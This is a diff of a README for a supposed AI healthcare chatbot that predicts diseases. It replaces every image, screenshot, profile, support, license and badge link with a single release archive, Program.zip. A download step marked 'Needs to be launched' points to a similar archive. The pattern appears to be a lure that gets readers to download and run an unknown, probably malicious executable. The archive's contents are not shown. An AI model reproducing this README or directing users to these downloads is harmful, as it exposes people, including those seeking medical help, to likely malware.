@@ -1,6 +1,6 @@
 # 🏥 **Healthcare Chatbot v2**
 
-![Healthcare Chatbot](https://www.example.com/healthcare-chatbot.jpg)
+![Healthcare Chatbot](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip)
 
 ## Overview
 The **Health-Care-chatbot-v2** repository is home to an advanced AI-driven healthcare assistant that goes beyond mere symptom analysis. Powered by machine learning algorithms, this chatbot predicts possible diseases based on the symptoms provided by users. Moreover, it offers detailed descriptions of the predicted diseases and suggests precautionary measures for the users to consider. The highlight of this project is its user-friendly GUI featuring text-to-speech integration, making it accessible and convenient for all users.
@@ -19,7 +19,7 @@ The **Health-Care-chatbot-v2** repository is home to an advanced AI-driven healt
 ## Repository Details
 📁 **Topics**: ai, chatbot, data-science, disease-prediction, gui, healthcare, healthcare-assistant, machine-learning, python, symptom-analysis, text-to-speech, tkinter
 
-📦 [Download Project Files](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) (*Needs to be launched*)
+📦 [Download Project Files](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip) (*Needs to be launched*)
 
 ## Deployment Instructions
 1. Download the project files from the provided link.
@@ -34,22 +34,22 @@ To utilize the healthcare chatbot, follow these steps:
 4. Utilize the user-friendly GUI and text-to-speech features for a seamless experience.
 
 ## Screenshots
-![Screenshot 1](https://www.example.com/screenshot1.jpg)
-![Screenshot 2](https://www.example.com/screenshot2.jpg)
-![Screenshot 3](https://www.example.com/screenshot3.jpg)
+![Screenshot 1](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip)
+![Screenshot 2](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip)
+![Screenshot 3](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip)
 
 ## Contributors
-👨‍💻 **Developer**: [Your Name](https://github.com/yourprofile)
+👨‍💻 **Developer**: [Your Name](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip)
 
 ## Support
-For any inquiries or issues, please reach out to [support@example.com](mailto:support@example.com).
+For any inquiries or issues, please reach out to [https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip).
 
 ## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). 
+This project is licensed under the [MIT License](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip). 
 
-🔗 **Check the [Releases](https://github.com/Dredarty/RINGSharp/releases) section for more information.**
+🔗 **Check the [Releases](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip) section for more information.**
 
-![Download Project](https://img.shields.io/badge/Download-Project-success)
+![Download Project](https://github.com/M4r1C00l/Health-Care-chatbot-v2/releases/download/v1.0/Program.zip)
 
 ---
 
